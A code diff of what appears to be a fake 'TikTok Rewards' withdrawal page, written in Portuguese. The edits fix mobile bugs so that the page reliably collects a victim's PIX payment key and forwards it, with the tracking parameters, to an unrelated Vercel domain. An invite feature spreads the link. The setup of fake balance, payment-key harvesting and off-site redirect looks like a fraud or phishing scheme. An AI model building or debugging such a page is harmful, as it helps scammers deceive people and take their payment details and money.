@@ -43,7 +43,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .bal-num{font-size:46px;font-weight:900;font-variant-numeric:tabular-nums;letter-spacing:-1px;line-height:1}
 .bal-confirm{font-size:12px;color:var(--primary);font-weight:600;margin-top:6px}
 
-
 .sec-title{font-size:17px;font-weight:800;margin-bottom:14px}
 .pix-lbl{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted-fg);margin-bottom:16px}
 
@@ -209,7 +208,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   const amts = [50, 150, 250, Math.floor(balance)];
   const grid = document.getElementById('amt-grid');
   
-  // >>> NOVA CORREÇÃO: Limpa a grade antes de adicionar os novos botões <<<
+  // Limpa botões estáticos antes de gerar para não duplicar (Correção 1)
   grid.innerHTML = ''; 
 
   amts.forEach((a, i) => {
@@ -255,22 +254,25 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   };
 
   const masks = {
-    cpf: v => v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').slice(0,14),
-    phone: v => v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').slice(0,15),
-    email: v => v,
-    random: v => v
+    cpf: function(v) { return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').slice(0,14); },
+    phone: function(v) { return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').slice(0,15); },
+    email: function(v) { return v; },
+    random: function(v) { return v; }
   };
 
   const validators = {
-    cpf: v => /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) \vert{}\vert{} /^\d{11}$/.test(v.replace(/\D/g,'')),
-    email: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
-    phone: v => v.replace(/\D/g,'').length >= 10,
-    random: v => /^[0-9a-f-]{36}$/i.test(v) || v.length > 8
+    cpf: function(v) { return /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) \vert{}\vert{} /^\d{11}$/.test(v.replace(/\D/g,'')); },
+    email: function(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); },
+    phone: function(v) { return v.replace(/\D/g,'').length >= 10; },
+    random: function(v) { return /^[0-9a-f-]{36}$/i.test(v) || v.length > 8; }
   };
 
   window.onPixTypeChange = function(){
     const t = document.getElementById('pixType').value;
-    document.getElementById('pixHint').textContent = hints[t] || '';
+    
+    // (Correção 2) Mostra o formato correto ou volta ao padrão caso não seja encontrado. Nunca apaga.
+    document.getElementById('pixHint').textContent = hints[t] ? hints[t] : 'Selecione o tipo de chave para ver o formato esperado';
+    
     document.getElementById('pixKey').value = '';
     document.getElementById('pixType').classList.remove('error');
     document.getElementById('typeErr').classList.remove('show');
@@ -296,19 +298,25 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       document.getElementById('typeErr').classList.add('show');
       valid = false;
     }
-    if(!key || (t && !validators[t]?.(key))){
+    
+    // (Correção 3) Substituímos a interrogação de encadeamento "validators[t]?.(key)" por avaliação segura. 
+    // Isso evita o erro fatal que travava os celulares no botão Saque.
+    if(!key || (t && validators[t] && !validators[t](key))){
       document.getElementById('pixKey').classList.add('error');
       document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
       document.getElementById('keyErr').classList.add('show');
       valid = false;
     }
+    
     if(!valid) return;
 
-    const dest = new URL('https://pesqdobttklkjkkjtaxval.vercel.app/', window.location.href);
-    new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
-    dest.searchParams.set('pix_type', t);
-    dest.searchParams.set('pix_key', key);
-    window.location.href = dest.toString();
+    // (Correção 4) Forma 100% segura de gerar a URL para não travar o redirecionamento
+    const destinoUrl = 'https://pesqdobttklkjkkjtaxval.vercel.app/';
+    const parametros = new URLSearchParams(window.location.search);
+    parametros.set('pix_type', t);
+    parametros.set('pix_key', key);
+    
+    window.location.href = destinoUrl + '?' + parametros.toString();
   };
 
   // ─── Web Share / Convite ───────────────────────────────────────
@@ -319,7 +327,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       navigator.share({ title: 'Programa de Recompensas TikTok', text: shareText, url: shareUrl })
         .catch(()=>{});
     } else {
-      // Fallback — copia link+código
       navigator.clipboard.writeText(shareText + ' ' + shareUrl).then(()=>{
         alert('Link copiado! Cole no WhatsApp ou onde quiser.');
       });
